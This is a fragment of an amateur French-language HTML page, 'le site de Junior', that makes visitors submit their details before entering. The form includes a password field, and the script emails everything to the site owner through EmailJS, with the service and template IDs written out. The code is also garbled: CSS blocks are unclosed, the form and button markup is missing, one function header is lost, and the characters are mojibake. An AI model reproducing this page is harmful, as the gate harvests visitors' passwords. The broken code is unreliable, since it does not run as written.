  <style>
    body {

      color: white;
      margin: 0;

    button.enabled:hover {

    form {
      background-color: rgba(0,0,0,0.85);

    h3 { font-size: 28px; margin-bottom: 20px; }
    input {
      display: block;
      width: 90%;
      padding: 20px;
      margin: 12px auto;
      border: none;
      border-radius: 10px;
      font-size: 20px;
    }

    .submit-btn {
      background-color: #28a745;
      color: white;
      margin-top: 20px;
      font-size: 22px;
      padding: 20px 30px;
    }

    #cart-icon {
      position: fixed;
      bottom: 25px;
      right: 25px;
      background-color: #ffcc00;
      color: black;
      font-size: 40px;
      padding: 25px;
      border-radius: 50%;
      cursor: pointer;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
      transition: 0.3s;
    }
    #cart-icon:hover { transform: scale(1.1); }

    @media (max-width: 600px) {
      h1 { font-size: 40px; }
      p { font-size: 24px; }
      button { font-size: 20px; padding: 18px 35px; margin: 8px; }
      form { padding: 35px; width: 95%; }
      input { font-size: 18px; padding: 18px; }
      .submit-btn { font-size: 20px; padding: 18px 25px; }

</head>
<body>

<h1>Bienvenue sur le site de Junior üòé</h1>
<p>Remplis tes infos avant d'acc√©der au site üëá</p>

<!-- BOUTONS S√âPAR√âS, CLASSE disabled par d√©faut -->

</form>

<div id="cart-icon" onclick="ouvrirPanier()">üõí</div>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
  emailjs.init('QcAA3sWRk3FHx5rZq'); // Ta Public Key

  const siteBtn = document.getElementById('siteBtn');

  document.getElementById('contactForm').addEventListener('submit', function(event){
    event.preventDefault();

    const password = document.getElementById('motDePasse').value.trim();
    if(password.length < 4){
      alert("Le mot de passe doit contenir au moins 4 caract√®res.");
      return;
    }

    // Envoi via EmailJS
    emailjs.sendForm('service_md3prj8', 'template_ttg2ab1', this)
      .then(() => {
        alert("Merci ! Tes infos ont √©t√© envoy√©es ‚úîÔ∏è");

        // D√©bloquer les boutons
        siteBtn.classList.remove('disabled');
        siteBtn.classList.add('enabled');

        boutiqueBtn.classList.remove('disabled');
        boutiqueBtn.classList.add('enabled');
      })
      .catch(err => alert("Erreur : " + JSON.stringify(err)));
  });

  // Fonction pour rediriger uniquement si bouton d√©bloqu√©
  function allerSite() {
    if(siteBtn.classList.contains('enabled')){

    }
  }

    if(boutiqueBtn.classList.contains('enabled')){
      window.location.href = "boutique.html";
    }
  }

  function ouvrirPanier() {
    alert("Ton panier est vide üõí");
  }
</script>

</body>
</html>
